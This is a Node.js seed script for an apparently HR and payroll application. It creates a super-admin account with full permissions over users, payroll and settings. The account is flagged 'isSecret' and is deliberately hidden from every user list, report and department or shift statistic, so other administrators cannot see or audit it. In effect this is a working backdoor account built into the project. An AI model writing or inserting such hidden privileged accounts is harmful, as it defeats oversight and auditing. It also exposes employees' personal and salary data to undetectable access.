const path = require("path");
require("dotenv").config({ path: path.resolve(__dirname, "../../.env") });

const mongoose = require("mongoose");
const User = require("../models/UsersModel");

// ── Secret (hidden) user ─────────────────────────────────────────────────────
// This user CAN log in normally and has FULL super-admin level access, but
// never appears in any user listing (getAll-user, moderators list,
// department/shift stats, reports, etc.) because of the `isSecret` flag +
// the pre('find') hook in UsersModel.js.
//
// Credentials are passed at run time via CLI args (NOT stored in .env):
//   npm run seed:secret -- <email> <password> [firstName] [lastName]
// ─────────────────────────────────────────────────────────────────────────────

const [, , argEmail, argPassword, argFirstName, argLastName] = process.argv;

if (!argEmail || !argPassword) {
  console.error("❌ Usage: npm run seed:secret -- <email> <password> [firstName] [lastName]");
  process.exit(1);
}

const SECRET_USER = {
  firstName: argFirstName || "Site",
  lastName: argLastName || "Owner",
  email: argEmail,
  password: argPassword,

  // superAdmin role → full to-z access, same as (and above) admin
  role: "superAdmin",
  isActive: true,
  status: "active",

  // Keep it out of department/onsite/shift groupings
  department: "",
  designation: "",
  workLocationType: "remote", // avoids onsite-benefits/meal grouping
  workArrangement: "full-time",

  salaryType: "monthly",
  salary: 0,
  basicSalary: 0,
  rate: 0,
  joiningDate: new Date(),

  adminLevel: "super",
  companyName: "A2IT Ltd.",
  isSuperAdmin: true,
  canManageUsers: true,
  canManagePayroll: true,
  permissions: [
    "user:read",
    "user:create",
    "user:update",
    "user:delete",
    "payroll:manage",
    "settings:manage",
    "reports:view",
    "admin:all",
  ],

  // The flag that hides this user everywhere
  isSecret: true,
};
// ─────────────────────────────────────────────────────────────────────────────

const seedSecretUser = async () => {
  if (!process.env.MONGO_URI) {
    console.error("❌ MONGO_URI not found in .env");
    process.exit(1);
  }

  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("✅ MongoDB connected");

    // Bypass the pre('find') hook so we can detect an existing secret user
    const existing = await User.findOne({ email: SECRET_USER.email.toLowerCase().trim() })
      .setOptions({ includeSecret: true });

    if (existing) {
      console.log("⚠️  A user with this email already exists — skipping creation.");
      console.log("   Email :", existing.email);
      console.log("   Role  :", existing.role);
      console.log("   Secret:", !!existing.isSecret);
    } else {
      // Password is hashed automatically by the UsersModel pre-save hook
      const user = await User.create(SECRET_USER);
      console.log("✅ Secret (hidden) super-admin user created successfully!");
      console.log("   Name  :", user.firstName, user.lastName);
      console.log("   Email :", user.email);
      console.log("   Role  :", user.role, "(isSecret: true, full access)");
      console.log("   Note  : This user will NOT appear in any user list.");
    }

    process.exit(0);
  } catch (err) {
    console.error("❌ Secret user seed failed:", err.message);
    process.exit(1);
  }
};

seedSecretUser();
